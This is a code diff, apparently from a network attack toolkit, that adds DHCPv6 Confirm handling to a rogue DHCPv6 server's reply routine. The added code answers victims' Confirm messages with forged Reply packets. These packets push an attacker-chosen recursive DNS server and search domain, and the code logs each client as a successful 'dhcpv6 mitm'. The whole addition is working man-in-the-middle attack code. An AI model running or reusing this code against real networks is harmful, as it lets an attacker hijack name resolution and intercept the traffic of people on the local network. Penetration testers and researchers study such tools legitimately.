@@ -549,11 +549,46 @@ def reply(request):
 
             # endregion
 
-            # # DHCPv6 Confirm
-            # if request.haslayer(DHCP6_Confirm):
-            #     Base.print_info("Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
-            #           request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)
-            #
+            # region DHCPv6 Confirm
+            if request['DHCPv6']['message-type'] == 4:
+
+                # region Get Client DUID time and client IPv6 address
+                client_duid_time = 0
+                client_ipv6_address = None
+
+                for dhcpv6_option in request['DHCPv6']['options']:
+                    if dhcpv6_option['type'] == 1:
+                        client_duid_time = dhcpv6_option['value']['duid-time']
+                    if dhcpv6_option['type'] == 3:
+                        client_ipv6_address = dhcpv6_option['value']['ipv6-address']
+                # endregion
+
+                # region Make and send DHCPv6 Reply packet
+                dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
+                                                        ethernet_dst_mac=request['Ethernet']['source'],
+                                                        ipv6_src=your_local_ipv6_address,
+                                                        ipv6_dst=request['IPv6']['source-ip'],
+                                                        transaction_id=request['DHCPv6']['transaction-id'],
+                                                        dns_address=recursive_dns_address,
+                                                        domain_search=dns_search,
+                                                        ipv6_address=client_ipv6_address,
+                                                        client_duid_timeval=client_duid_time)
+                global_socket.send(dhcpv6_reply)
+                # endregion
+
+                # region Add Client info in global clients dictionary and print info message
+                add_client_info_in_dictionary(client_mac_address,
+                                              {"advertise address": client_ipv6_address, "dhcpv6 mitm": "success"},
+                                              client_already_in_dictionary)
+
+                Base.print_info("DHCPv6 Confirm from: ", request['IPv6']['source-ip'] +
+                                " (" + request['Ethernet']['source'] + ")",
+                                " XID: ", hex(request['DHCPv6']['transaction-id']),
+                                " IAA: ", client_ipv6_address)
+                # endregion
+
+            # endregion
+
             # # DHCPv6 Decline
             # if request.haslayer(DHCP6_Decline):
             #     print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
